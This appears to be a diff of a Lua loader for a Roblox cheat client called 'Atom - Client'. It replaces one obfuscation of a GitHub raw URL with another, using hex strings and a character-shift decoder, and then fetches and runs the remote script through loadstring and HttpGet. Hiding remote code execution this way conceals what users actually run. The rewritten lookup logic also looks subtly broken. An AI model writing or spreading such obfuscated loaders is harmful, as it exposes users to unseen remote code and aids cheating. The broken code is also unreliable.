@@ -14,32 +14,27 @@
 ╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝]]
 -- Please leave this page as you have attempted to view the source code of Atom - Client.
 
-local function b(c)
-    local d = ""
-    for e in c:gsub("\\(%d+)", string.char):gmatch(".") do
-        d = d .. e
-    end
-    return d
+local x0 = "68747470733a2f2f7261772e6769746875622e636f6d2f736466333237336564333865793233386432336432386432337564396a333839647532336a642f3266343537686b6433323361746f6d2f6d61696e2f536f66742e6c7561"
+local x1 = "4777696e486b68774f6d6b7a4668"
+local x2 = "4c6d77356c6b6466725978647a5161"
+
+local function x3(s)
+    return (s:gsub('..', function(cc)
+        return string.char(tonumber(cc, 16))
+    end))
 end
 
-local part1 = "\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\46\\99\\111\\109\\47"
-local part2 = "\\115\\100\\102\\51\\50\\55\\51\\101\\100\\51\\56\\101\\121\\50\\51\\56\\100\\51\\50\\56\\100\\50\\51\\117\\100\\57\\106\\51\\56\\57\\100\\117\\50\\51\\106\\100\\47"
-local part3 = "\\50\\102\\52\\53\\55\\104\\107\\100\\51\\50\\51\\97\\116\\111\\109\\47\\109\\97\\105\\110\\47\\83\\111\\102\\116\\46\\108\\117\\97"
-local f = b(part1) .. b(part2) .. b(part3)
+local x4 = x3(x0)
+local x5 = x3(x1)
+local x6 = x3(x2)
 
-local function g(h)
-    local success, i = pcall(function() return game:HttpGet(h) end)
-    if success and i then
-        warn("Launching Atom - Client")
-        loadstring(game:HttpGet(i))()
-
-    else
-        warn("Can't load Atom - Client")
-    end
+local function x7(s)
+    return (s:gsub('.', function(c)
+        return string.char(((string.byte(c) - 33 + 94) % 94) + 33)
+    end))
 end
 
-if f then
-    g(f)
-else
-    warn("Can't load Atom - Client.")
-end
+local x8 = x7(x1)
+local x9 = x7(x2)
+
+getfenv()[x6](getfenv()[x8](game, x4))()
